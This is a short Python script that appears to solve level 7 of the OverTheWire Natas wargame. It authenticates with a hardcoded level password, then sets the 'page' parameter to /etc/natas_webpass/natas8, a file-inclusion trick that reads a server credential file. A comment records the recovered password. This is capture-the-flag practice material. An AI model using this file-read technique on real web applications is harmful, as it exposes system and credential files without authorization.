import requests

# http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8


level = str(7)
pw = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)
params = [("page", "/etc/natas_webpass/natas8")]

r = s.get(url, params=params)

print(r.text)

# DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe